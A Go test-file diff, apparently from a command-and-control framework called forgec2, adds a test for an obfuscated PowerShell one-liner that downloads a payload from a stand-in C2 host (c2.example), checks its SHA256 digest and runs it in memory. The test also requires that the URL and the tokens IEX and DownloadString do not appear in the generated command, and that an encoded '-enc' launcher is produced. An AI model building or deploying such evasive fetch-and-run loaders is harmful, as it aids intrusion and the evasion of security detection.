@@ -5,6 +5,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/forgec2/forgec2/internal/obfuscation"
 )
 
 func TestClampIntervalJitter_Defaults(t *testing.T) {
@@ -191,5 +193,49 @@ func TestResolveBeaconRandomization(t *testing.T) {
 				t.Errorf("resolveBeaconRandomization(%q,%q) = %q, want %q", tc.formMode, tc.defMode, got, tc.want)
 			}
 		})
+	}
+}
+
+func findOneLiner(items []oneLinerItem, name string) string {
+	for _, item := range items {
+		if item.Name == name {
+			return item.Command
+		}
+	}
+	return ""
+}
+
+func TestBuildOneLiners_PS1VerifiedMemoryLoader(t *testing.T) {
+	const name = "PS1 Verified Memory Load (obfuscated)"
+	base := buildOneLiners("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "")
+	verified := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "ABC123", obfuscation.PSObfuscateOptions{})
+	if len(verified) != len(base)+1 {
+		t.Fatalf("ps1 verified variants = %d, want base+1 (%d)", len(verified), len(base)+1)
+	}
+	cmd := findOneLiner(verified, name)
+	if cmd == "" {
+		t.Fatalf("verified ps1 variant %q missing", name)
+	}
+	// The legacy launcher encodes UTF-8; neither URL nor digest may leak in
+	// cleartext, and IEX/DownloadString are the two tokens we are avoiding.
+	for _, token := range []string{"https://c2.example/p", "abc123", "IEX", "DownloadString"} {
+		if strings.Contains(cmd, token) {
+			t.Errorf("command must not contain %q: %s", token, cmd)
+		}
+	}
+	inner := ps1VerifiedMemoryLoader("https://c2.example/p", "ABC123")
+	for _, token := range []string{"DownloadData", "SHA256", "abc123", "ScriptBlock", "for($i=0;$i -lt 3"} {
+		if !strings.Contains(inner, token) {
+			t.Errorf("inner loader missing %q: %s", token, inner)
+		}
+	}
+
+	enc := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "ABC123", obfuscation.PSObfuscateOptions{Launcher: "encodedcommand"})
+	encCmd := findOneLiner(enc, name)
+	if !strings.Contains(encCmd, " -enc ") {
+		t.Fatalf("encoded preset must produce -enc launcher: %s", encCmd)
+	}
+	if strings.Contains(encCmd, "https://c2.example/p") {
+		t.Fatalf("encoded launcher leaked the URL: %s", encCmd)
 	}
 }
